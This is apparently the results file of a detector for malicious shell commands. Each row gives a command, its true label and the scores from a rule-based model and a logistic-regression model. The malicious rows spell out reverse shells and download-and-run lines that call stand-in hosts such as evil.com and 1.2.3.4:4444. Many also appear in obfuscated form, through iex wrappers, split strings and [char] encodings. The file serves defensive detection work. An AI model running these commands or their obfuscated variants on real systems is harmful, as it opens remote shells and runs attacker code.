command,true_label,pred_rules,pred_lr,rule_score,lr_score,obfuscation_family,shell_type,difficulty
"grep error logs.txt%*#^^&4@ grep error logs.txt%*#^^&4@",0,0,1,0.0,1.0,unknown,unknown,unknown
"nc localhost 1234$39%548$",0,1,0,1.0,0.0,unknown,unknown,unknown
"curl http://example.com13",0,0,0,0.0,0.0,unknown,unknown,unknown
"curl http://example.com9@*!",0,0,0,0.0,0.0,unknown,unknown,unknown
"powershell Get-Process",0,0,0,0.0,0.0,unknown,unknown,unknown
"ls -la5%*!8",0,0,0,0.0,0.0,unknown,unknown,unknown
"powershell Get-Process powershell Get-Process",0,0,0,0.0,0.0,unknown,unknown,unknown
"wget http://example.com42&",0,0,0,0.0,0.0,unknown,unknown,unknown
"cat file.txt cat file.txt",0,0,0,0.0,0.0,unknown,unknown,unknown
"echo hello world",0,0,0,0.0,0.0,unknown,unknown,unknown
"cat file.txt cat file.txt",0,0,0,0.0,0.0,unknown,unknown,unknown
"ls -la0864$^@$# ls -la0864$^@$#",0,0,1,0.0,1.0,unknown,unknown,unknown
"sort data.txt | uniq",0,0,1,0.0,1.0,unknown,unknown,unknown
"powershell Get-Process powershell Get-Process",0,0,0,0.0,0.0,unknown,unknown,unknown
"curl http://example.com752!4",0,0,0,0.0,0.0,unknown,unknown,unknown
"wget http://example.com%!*#!8#",0,0,0,0.0,0.0,unknown,unknown,unknown
"cut -d ',' -f1 file.csv!6* cut -d ',' -f1 file.csv!6*",0,0,1,0.0,1.0,unknown,unknown,unknown
"wget http://example.com wget http://example.com",0,0,0,0.0,0.0,unknown,unknown,unknown
"echo hello world5% echo hello world5%",0,0,0,0.0,0.0,unknown,unknown,unknown
"cut -d ',' -f1 file.csv cut -d ',' -f1 file.csv",0,0,1,0.0,1.0,unknown,unknown,unknown
"curl http://example.com03998% curl http://example.com03998%",0,0,0,0.0,0.0,unknown,unknown,unknown
"sort data.txt | uniq",0,0,1,0.0,1.0,unknown,unknown,unknown
"curl http://example.com557 curl http://example.com557",0,0,0,0.0,0.0,unknown,unknown,unknown
"echo aGVsbG8= | base64 -d^$!$4$",0,0,1,0.0,1.0,unknown,unknown,unknown
"ls -la",0,0,0,0.0,0.0,unknown,unknown,unknown
"curl http://example.com28@8$",0,0,0,0.0,0.0,unknown,unknown,unknown
"cat file.txt cat file.txt",0,0,0,0.0,0.0,unknown,unknown,unknown
"grep error logs.txt grep error logs.txt",0,0,0,0.0,0.0,unknown,unknown,unknown
"curl http://example.com",0,0,0,0.0,0.0,unknown,unknown,unknown
"sort data.txt | uniq944",0,0,1,0.0,1.0,unknown,unknown,unknown
"cut -d ',' -f1 file.csv625*",0,0,1,0.0,1.0,unknown,unknown,unknown
"echo hello world#&14715 echo hello world#&14715",0,0,1,0.0,1.0,unknown,unknown,unknown
"cat file.txt cat file.txt",0,0,0,0.0,0.0,unknown,unknown,unknown
"echo hello world28^&",0,0,0,0.0,0.0,unknown,unknown,unknown
"wget http://example.com9*45 wget http://example.com9*45",0,0,0,0.0,0.0,unknown,unknown,unknown
"echo hello world echo hello world",0,0,0,0.0,0.0,unknown,unknown,unknown
"grep error logs.txt^6&$",0,0,0,0.0,0.0,unknown,unknown,unknown
"grep error logs.txt",0,0,0,0.0,0.0,unknown,unknown,unknown
"sort data.txt | uniq7@92!",0,0,1,0.0,1.0,unknown,unknown,unknown
"echo hello world0&%^0412@ echo hello world0&%^0412@",0,0,1,0.0,1.0,unknown,unknown,unknown
"nc localhost 123470@$0!492 nc localhost 123470@$0!492",0,1,1,1.0,1.0,unknown,unknown,unknown
"powershell Get-Process0#0881801",0,0,0,0.0,0.0,unknown,unknown,unknown
"echo hello world",0,0,0,0.0,0.0,unknown,unknown,unknown
"nc localhost 1234#8#827#28",0,1,0,1.0,0.0,unknown,unknown,unknown
"wget http://example.com wget http://example.com",0,0,0,0.0,0.0,unknown,unknown,unknown
"curl http://example.com3421",0,0,0,0.0,0.0,unknown,unknown,unknown
"cut -d ',' -f1 file.csv cut -d ',' -f1 file.csv",0,0,1,0.0,1.0,unknown,unknown,unknown
"ls -la ls -la",0,0,0,0.0,0.0,unknown,unknown,unknown
"ls -la1$2",0,0,0,0.0,0.0,unknown,unknown,unknown
"cut -d ',' -f1 file.csv&150",0,0,1,0.0,1.0,unknown,unknown,unknown
"nc localhost 123481^09!03",0,1,0,1.0,0.0,unknown,unknown,unknown
"nc localhost 1234",0,1,0,1.0,0.0,unknown,unknown,unknown
"powershell Get-Process",0,0,0,0.0,0.0,unknown,unknown,unknown
"nc localhost 1234",0,1,0,1.0,0.0,unknown,unknown,unknown
"echo hello world!99@2",0,0,0,0.0,0.0,unknown,unknown,unknown
"ls -la&9#^4 ls -la&9#^4",0,0,1,0.0,1.0,unknown,unknown,unknown
"cut -d ',' -f1 file.csv10800#",0,0,1,0.0,1.0,unknown,unknown,unknown
"sort data.txt | uniq",0,0,1,0.0,1.0,unknown,unknown,unknown
"echo aGVsbG8= | base64 -d echo aGVsbG8= | base64 -d",0,0,1,0.0,1.0,unknown,unknown,unknown
"grep error logs.txt!30",0,0,0,0.0,0.0,unknown,unknown,unknown
"wget http://example.com",0,0,0,0.0,0.0,unknown,unknown,unknown
"cat file.txt",0,0,0,0.0,0.0,unknown,unknown,unknown
"ls -la*%*",0,0,0,0.0,0.0,unknown,unknown,unknown
"cut -d ',' -f1 file.csv6@90216 cut -d ',' -f1 file.csv6@90216",0,0,1,0.0,1.0,unknown,unknown,unknown
"nc localhost 123488381 nc localhost 123488381",0,1,0,1.0,0.0,unknown,unknown,unknown
"sort data.txt | uniq",0,0,1,0.0,1.0,unknown,unknown,unknown
"printf test && nc 1.2.3.4 4444!7^69520& printf test && nc 1.2.3.4 4444!7^69520&",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""nc -e /bin/sh 1.2.3.4 4444""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]110+[char]99+[char]32+[char]45+[char]101+[char]32+[char]47+[char]98+[char]105+[char]110+[char]47+[char]115+[char]104+[char]32+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]32+[char]52+[char]52+[char]52+[char]52",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""printf test && nc 1.2.3.4 4444""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""bash -i >& /dev/tcp/1.2.3.4/4444 0>&1""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"[char]99+[char]97+[char]116+[char]32+[char]102+[char]105+[char]108+[char]101+[char]46+[char]116+[char]120+[char]116+[char]32+[char]124+[char]32+[char]98+[char]97+[char]115+[char]101+[char]54+[char]52+[char]32+[char]45+[char]100",1,0,0,0.0,0.0,unknown,unknown,unknown
"wget http://evil.com/payload.sh -O- | sh5@!33&%0",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]99+[char]117+[char]114+[char]108+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109+[char]47+[char]115+[char]104+[char]101+[char]108+[char]108+[char]46+[char]115+[char]104+[char]32+[char]124+[char]32+[char]115+[char]104",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""nc -e /bin/sh 1.2.3.4 4444""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""powershell -enc PAYLOAD""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]98+[char]97+[char]115+[char]104+[char]32+[char]45+[char]105+[char]32+[char]62+[char]38+[char]32+[char]47+[char]100+[char]101+[char]118+[char]47+[char]116+[char]99+[char]112+[char]47+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]47+[char]52+[char]52+[char]52+[char]52+[char]32+[char]48+[char]62+[char]38+[char]49",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""bash -i >& /dev/tcp/1.2.3.4/4444 0>&152$059""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"printf test && nc 1.2.3.4 4444",1,1,1,1.0,1.0,unknown,unknown,unknown
"nc -e /bin/sh 1.2.3.4 4444",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]110+[char]99+[char]32+[char]45+[char]101+[char]32+[char]47+[char]98+[char]105+[char]110+[char]47+[char]115+[char]104+[char]32+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]32+[char]52+[char]52+[char]52+[char]52+[char]56+[char]35+[char]64+[char]53+[char]38",1,0,0,0.0,0.0,unknown,unknown,unknown
"""po""+""wershell"" -enc PAYLOAD",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]119+[char]103+[char]101+[char]116+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109+[char]47+[char]112+[char]97+[char]121+[char]108+[char]111+[char]97+[char]100+[char]46+[char]115+[char]104+[char]32+[char]45+[char]79+[char]45+[char]32+[char]124+[char]32+[char]115+[char]104+[char]56+[char]52",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""echo hello && curl http://evil.com""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"echo hello && curl http://evil.com",1,0,1,0.0,1.0,unknown,unknown,unknown
"cat file.txt | base64 -d^4 cat file.txt | base64 -d^4",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""wget http://evil.com/payload.sh -O- | sh""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"wget http://evil.com/payload.sh -O- | sh wget http://evil.com/payload.sh -O- | sh",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""bash -i >& /dev/tcp/1.2.3.4/4444 0>&1""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""bash -i >& /dev/tcp/1.2.3.4/4444 0>&1""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"wget http://evil.com/payload.sh -O- | sh",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""wget http://evil.com/payload.sh -O- | sh""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]112+[char]114+[char]105+[char]110+[char]116+[char]102+[char]32+[char]116+[char]101+[char]115+[char]116+[char]32+[char]38+[char]38+[char]32+[char]110+[char]99+[char]32+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]32+[char]52+[char]52+[char]52+[char]52",1,0,0,0.0,0.0,unknown,unknown,unknown
"[char]110+[char]99+[char]32+[char]45+[char]101+[char]32+[char]47+[char]98+[char]105+[char]110+[char]47+[char]115+[char]104+[char]32+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]32+[char]52+[char]52+[char]52+[char]52",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""printf test && nc 1.2.3.4 4444""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""curl http://evil.com/shell.sh | sh""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""curl http://evil.com/shell.sh | sh""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"echo hello && curl http://evil.com",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""curl http://evil.com/shell.sh | sh""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]112+[char]111+[char]119+[char]101+[char]114+[char]115+[char]104+[char]101+[char]108+[char]108+[char]32+[char]45+[char]101+[char]110+[char]99+[char]32+[char]80+[char]65+[char]89+[char]76+[char]79+[char]65+[char]68",1,0,0,0.0,0.0,unknown,unknown,unknown
"[char]112+[char]114+[char]105+[char]110+[char]116+[char]102+[char]32+[char]116+[char]101+[char]115+[char]116+[char]32+[char]38+[char]38+[char]32+[char]110+[char]99+[char]32+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]32+[char]52+[char]52+[char]52+[char]52",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""wget http://evil.com/payload.sh -O- | sh""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"curl http://evil.com/shell.sh | sh",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""cat file.txt | base64 -d""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""echo hello && curl http://evil.com05""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""powershell -enc PAYLOAD934 powershell -enc PAYLOAD934""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""powershell -enc PAYLOAD""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""curl http://evil.com/shell.sh | sh295%""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""printf test && nc 1.2.3.4 4444""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]99+[char]117+[char]114+[char]108+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109+[char]47+[char]115+[char]104+[char]101+[char]108+[char]108+[char]46+[char]115+[char]104+[char]32+[char]124+[char]32+[char]115+[char]104",1,0,0,0.0,0.0,unknown,unknown,unknown
"printf test && nc 1.2.3.4 4444$@1@^3",1,1,1,1.0,1.0,unknown,unknown,unknown
"wget http://evil.com/payload.sh -O- | sh",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]98+[char]97+[char]115+[char]104+[char]32+[char]45+[char]105+[char]32+[char]62+[char]38+[char]32+[char]47+[char]100+[char]101+[char]118+[char]47+[char]116+[char]99+[char]112+[char]47+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]47+[char]52+[char]52+[char]52+[char]52+[char]32+[char]48+[char]62+[char]38+[char]49+[char]32+[char]98+[char]97+[char]115+[char]104+[char]32+[char]45+[char]105+[char]32+[char]62+[char]38+[char]32+[char]47+[char]100+[char]101+[char]118+[char]47+[char]116+[char]99+[char]112+[char]47+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]47+[char]52+[char]52+[char]52+[char]52+[char]32+[char]48+[char]62+[char]38+[char]49",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""curl http://evil.com/shell.sh | sh""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""powershell -enc PAYLOAD""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]98+[char]97+[char]115+[char]104+[char]32+[char]45+[char]105+[char]32+[char]62+[char]38+[char]32+[char]47+[char]100+[char]101+[char]118+[char]47+[char]116+[char]99+[char]112+[char]47+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]47+[char]52+[char]52+[char]52+[char]52+[char]32+[char]48+[char]62+[char]38+[char]49",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""cat file.txt | base64 -d""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"echo hello && curl http://evil.com",1,0,1,0.0,1.0,unknown,unknown,unknown
"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",1,0,1,0.0,1.0,unknown,unknown,unknown
"[char]112+[char]114+[char]105+[char]110+[char]116+[char]102+[char]32+[char]116+[char]101+[char]115+[char]116+[char]32+[char]38+[char]38+[char]32+[char]110+[char]99+[char]32+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]32+[char]52+[char]52+[char]52+[char]52+[char]64+[char]37+[char]48+[char]33+[char]42+[char]32+[char]112+[char]114+[char]105+[char]110+[char]116+[char]102+[char]32+[char]116+[char]101+[char]115+[char]116+[char]32+[char]38+[char]38+[char]32+[char]110+[char]99+[char]32+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]32+[char]52+[char]52+[char]52+[char]52+[char]64+[char]37+[char]48+[char]33+[char]42",1,0,0,0.0,0.0,unknown,unknown,unknown
"[char]99+[char]117+[char]114+[char]108+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109+[char]47+[char]115+[char]104+[char]101+[char]108+[char]108+[char]46+[char]115+[char]104+[char]32+[char]124+[char]32+[char]115+[char]104",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""curl http://evil.com/shell.sh | sh""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]119+[char]103+[char]101+[char]116+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109+[char]47+[char]112+[char]97+[char]121+[char]108+[char]111+[char]97+[char]100+[char]46+[char]115+[char]104+[char]32+[char]45+[char]79+[char]45+[char]32+[char]124+[char]32+[char]115+[char]104",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""curl http://evil.com/shell.sh | sh%&""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""echo hello && curl http://evil.com""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""powershell -enc PAYLOAD""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""printf test && nc 1.2.3.4 4444""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]112+[char]111+[char]119+[char]101+[char]114+[char]115+[char]104+[char]101+[char]108+[char]108+[char]32+[char]45+[char]101+[char]110+[char]99+[char]32+[char]80+[char]65+[char]89+[char]76+[char]79+[char]65+[char]68+[char]94+[char]56+[char]50+[char]42+[char]38",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""wget http://evil.com/payload.sh -O- | sh#^4#32!* wget http://evil.com/payload.sh -O- | sh#^4#32!*""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"nc -e /bin/sh 1.2.3.4 4444 nc -e /bin/sh 1.2.3.4 4444",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]99+[char]97+[char]116+[char]32+[char]102+[char]105+[char]108+[char]101+[char]46+[char]116+[char]120+[char]116+[char]32+[char]124+[char]32+[char]98+[char]97+[char]115+[char]101+[char]54+[char]52+[char]32+[char]45+[char]100",1,0,0,0.0,0.0,unknown,unknown,unknown
"[char]112+[char]111+[char]119+[char]101+[char]114+[char]115+[char]104+[char]101+[char]108+[char]108+[char]32+[char]45+[char]101+[char]110+[char]99+[char]32+[char]80+[char]65+[char]89+[char]76+[char]79+[char]65+[char]68",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""cat file.txt | base64 -d^045@!""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"[char]101+[char]99+[char]104+[char]111+[char]32+[char]104+[char]101+[char]108+[char]108+[char]111+[char]32+[char]38+[char]38+[char]32+[char]99+[char]117+[char]114+[char]108+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109",1,0,0,0.0,0.0,unknown,unknown,unknown
"[char]99+[char]117+[char]114+[char]108+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109+[char]47+[char]115+[char]104+[char]101+[char]108+[char]108+[char]46+[char]115+[char]104+[char]32+[char]124+[char]32+[char]115+[char]104",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""nc -e /bin/sh 1.2.3.4 444430%%!^57""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""curl http://evil.com/shell.sh | sh""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""""po""+""wershell"" -enc PAYLOAD""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"echo hello && curl http://evil.com",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""printf test && nc 1.2.3.4 4444""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""bash -i >& /dev/tcp/1.2.3.4/4444 0>&1""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""""po""+""wershell"" -enc PAYLOAD""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""powershell -enc PAYLOAD*412@""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""powershell -enc PAYLOAD""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""echo hello && curl http://evil.com5$1 echo hello && curl http://evil.com5$1""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"""po""+""wershell"" -enc PAYLOAD ""po""+""wershell"" -enc PAYLOAD",1,1,1,1.0,1.0,unknown,unknown,unknown
"echo hello && curl http://evil.com",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""bash -i >& /dev/tcp/1.2.3.4/4444 0>&1""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"""po""+""wershell"" -enc PAYLOAD5%$81",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""cat file.txt | base64 -d""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"nc -e /bin/sh 1.2.3.4 4444",1,1,1,1.0,1.0,unknown,unknown,unknown
"""po""+""wershell"" -enc PAYLOAD",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""wget http://evil.com/payload.sh -O- | sh""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"echo hello && curl http://evil.com",1,0,1,0.0,1.0,unknown,unknown,unknown
"""po""+""wershell"" -enc PAYLOAD*5",1,1,1,1.0,1.0,unknown,unknown,unknown
"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1 bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""cat file.txt | base64 -d""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"[char]98+[char]97+[char]115+[char]104+[char]32+[char]45+[char]105+[char]32+[char]62+[char]38+[char]32+[char]47+[char]100+[char]101+[char]118+[char]47+[char]116+[char]99+[char]112+[char]47+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]47+[char]52+[char]52+[char]52+[char]52+[char]32+[char]48+[char]62+[char]38+[char]49+[char]49+[char]64+[char]50+[char]32+[char]98+[char]97+[char]115+[char]104+[char]32+[char]45+[char]105+[char]32+[char]62+[char]38+[char]32+[char]47+[char]100+[char]101+[char]118+[char]47+[char]116+[char]99+[char]112+[char]47+[char]49+[char]46+[char]50+[char]46+[char]51+[char]46+[char]52+[char]47+[char]52+[char]52+[char]52+[char]52+[char]32+[char]48+[char]62+[char]38+[char]49+[char]49+[char]64+[char]50",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""echo hello && curl http://evil.com""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"cat file.txt | base64 -d",1,0,1,0.0,1.0,unknown,unknown,unknown
"$a=""wget http://evil.com/payload.sh -O- | sh""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""bash -i >& /dev/tcp/1.2.3.4/4444 0>&1257 bash -i >& /dev/tcp/1.2.3.4/4444 0>&1257""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"[char]119+[char]103+[char]101+[char]116+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109+[char]47+[char]112+[char]97+[char]121+[char]108+[char]111+[char]97+[char]100+[char]46+[char]115+[char]104+[char]32+[char]45+[char]79+[char]45+[char]32+[char]124+[char]32+[char]115+[char]104",1,0,0,0.0,0.0,unknown,unknown,unknown
"$a=""cat file.txt | base64 -d1#0%2 cat file.txt | base64 -d1#0%2""; iex $a",1,0,1,0.0,1.0,unknown,unknown,unknown
"nc -e /bin/sh 1.2.3.4 4444",1,1,1,1.0,1.0,unknown,unknown,unknown
"$a=""powershell -enc PAYLOAD""; iex $a",1,1,1,1.0,1.0,unknown,unknown,unknown
"[char]99+[char]117+[char]114+[char]108+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109+[char]47+[char]115+[char]104+[char]101+[char]108+[char]108+[char]46+[char]115+[char]104+[char]32+[char]124+[char]32+[char]115+[char]104+[char]32+[char]99+[char]117+[char]114+[char]108+[char]32+[char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47+[char]101+[char]118+[char]105+[char]108+[char]46+[char]99+[char]111+[char]109+[char]47+[char]115+[char]104+[char]101+[char]108+[char]108+[char]46+[char]115+[char]104+[char]32+[char]124+[char]32+[char]115+[char]104",1,0,0,0.0,0.0,unknown,unknown,unknown
